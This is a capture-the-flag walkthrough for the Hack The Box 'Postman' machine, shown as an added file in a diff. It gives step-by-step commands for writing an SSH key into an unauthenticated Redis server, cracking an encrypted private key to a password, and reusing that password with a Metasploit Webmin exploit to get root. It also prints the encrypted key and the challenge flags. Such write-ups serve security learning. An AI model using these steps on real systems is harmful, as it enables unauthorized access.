@@ -1,0 +1,163 @@
+I"�<p>Walkthrough for Postman - 10.10.10.160</p>
+
+<h2 id="overview">Overview</h2>
+
+<p>Discovered Redis was unauthed.
+Worked out could write config to /var/lib/redis/.ssh/
+so wrote ssh pub key to authorized_keys there
+logged in with my local private key as redis</p>
+
+<p>found Matt’s encrypted backup key which I used John to decrypt
+reused his password to attack webmin (running as root) with msf: linux/http/webmin_packageup_rce</p>
+
+<h2 id="scanning">Scanning</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARGET=10.10.10.160
+sudo nmap -Pn $TARGET -p- -T4
+</code></pre></div></div>
+
+<p>Gives:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-13 11:51 GMT
+Nmap scan report for 10.10.10.160
+Host is up (0.023s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+6379/tcp  open  redis
+10000/tcp open  snet-sensor-mgmt
+
+Nmap done: 1 IP address (1 host up) scanned in 11.91 seconds
+</code></pre></div></div>
+
+<p>redis looks good, get postman/Postman user from blog</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> rsa
+</code></pre></div></div>
+
+<p>save it as a file in local working directory</p>
+
+<p>next we need the white space to make it parsable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat </span>id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> temp.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>temp.txt | redis-cli <span class="nt">-h</span> 10.10.10.160 <span class="nt">-x</span> <span class="nb">set </span>crackit <span class="c">#this is just a key!</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config set dir /etc/ssh/
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config set dbfilename "authorized_keys"
+</code></pre></div></div>
+
+<p>(echo -e “\n\n”; id_rsa.pub; echo -e “\n\n”) &gt; foo.txt</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>save
+</code></pre></div></div>
+
+<p>doesn’t work, I do some research: /var/lib/redis/.ssh/ is the libs</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config set dir /var/lib/redis/.ssh/
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config set dbfilename authorized_keys
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>save
+</code></pre></div></div>
+
+<p>then on regular shell, ssh in:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh redis@<span class="nv">$TARGET</span> <span class="nt">-i</span> id_rsa <span class="nt">-vvvvvv</span>
+</code></pre></div></div>
+
+<p>on to user:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt
+<span class="nb">ls</span> <span class="c">#get id_rsa.bak</span>
+</code></pre></div></div>
+
+<p>this is wahats in it</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>save locally to and use ssh2john to crack it for a password: computer2008</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python /usr/share/john/ssh2john.py tmp/foo.txt &gt; forJohn.txt
+john forJohn.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su Matt
+computer2008
+</code></pre></div></div>
+
+<p>gives: <code class="highlighter-rouge">su: Authentication failure</code></p>
+
+<p>Matt:computer2008 is Webmin login!</p>
+
+<p>now I can attack with msf:</p>
+
+<p>linux/http/webmin_packageup_rce</p>
+
+<p>then try again</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span> <span class="no">LHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.38</span>
+<span class="n">set</span> <span class="no">SSL</span> <span class="no">True</span>
+<span class="n">set</span> <span class="no">USERNAME</span> <span class="no">Matt</span>
+<span class="n">set</span> <span class="no">PASSWORD</span> <span class="n">computer2008</span>
+<span class="n">set</span> <span class="no">RHOSTS</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.160</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /home/Matt/user.txt
+517ad0ec2458ca97af8d93aac08a2f3c
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /root/root.txt
+a257741c5bed8be7778c6ed95686ddce
+</code></pre></div></div>
+
+<h2 id="tools">Tools</h2>
+
+<p>redis-cli setup</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp
+wget http://download.redis.io/redis-stable.tar.gz
+tar xvzf redis-stable.tar.gz
+cd redis-stable
+make
+sudo cp src/redis-cli /usr/local/bin/
+chmod 755 /usr/local/bin/redis-cli
+</code></pre></div></div>
+:ET
